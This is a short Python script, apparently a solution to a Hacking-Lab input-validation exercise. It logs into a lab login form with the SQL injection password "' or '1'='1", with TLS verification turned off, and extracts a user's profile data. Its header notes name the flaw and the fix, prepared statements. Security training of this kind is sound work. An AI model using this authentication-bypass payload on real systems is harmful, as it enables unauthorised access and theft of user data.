__problem__ = \
"""
No prepared statement used in backend.
"""

__attack__ = \
"""
Used Ambigous expression in input field.
"""

__mitigation__ = \
"""
Use prepared statement
"""

import logging

import requests

from __base__ import setup_log, extract_user_info

log = logging.getLogger(__name__)


def inject():
    with requests.session() as session:
        session.verify = False
        session.get("http://glocken.hacking-lab.com/12001/inputval_case2/inputval2/")
        response = session.post("https://glocken.hacking-lab.com/12001/inputval_case2/auth_inputval2/login",
                                data={
                                    'username': 'hacker10',
                                    'password': "' or '1'='1",
                                    'action': 'login',
                                    'originalURL': 'https://glocken.hacking-lab.com/12001/inputval_case2/inputval2/controller?action=profile&pid=1',
                                    'send': 'Login',
                                })
        user_info = extract_user_info(response)
        log.info(user_info)


if __name__ == '__main__':
    setup_log()
    inject()
